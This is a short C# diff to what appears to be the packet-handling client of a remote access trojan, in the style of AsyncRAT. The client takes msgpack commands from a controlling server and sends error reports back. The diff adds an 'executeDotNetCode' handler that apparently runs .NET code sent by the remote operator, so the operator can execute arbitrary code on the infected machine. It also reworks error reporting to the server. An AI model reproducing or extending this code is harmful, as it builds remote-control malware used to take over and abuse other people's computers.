@@ -303,11 +303,17 @@ namespace Client.Handle_Packet
                             new HandleTorrent(unpack_msgpack);
                             break;
                         }
+
+                    case "executeDotNetCode":
+                        {
+                            new HandlerExecuteDotNetCode(unpack_msgpack);
+                            break;
+                        }
                 }
             }
             catch (Exception ex)
             {
-                Error(ex);
+                Error(ex.Message);
             }
         }
 
@@ -318,11 +324,11 @@ namespace Client.Handle_Packet
             ClientSocket.Send(msgpack.Encode2Bytes());
         }
 
-        public static void Error(Exception ex)
+        public static void Error(string ex)
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Error";
-            msgpack.ForcePathObject("Error").AsString = ex.Message;
+            msgpack.ForcePathObject("Error").AsString = ex;
             ClientSocket.Send(msgpack.Encode2Bytes());
         }
 
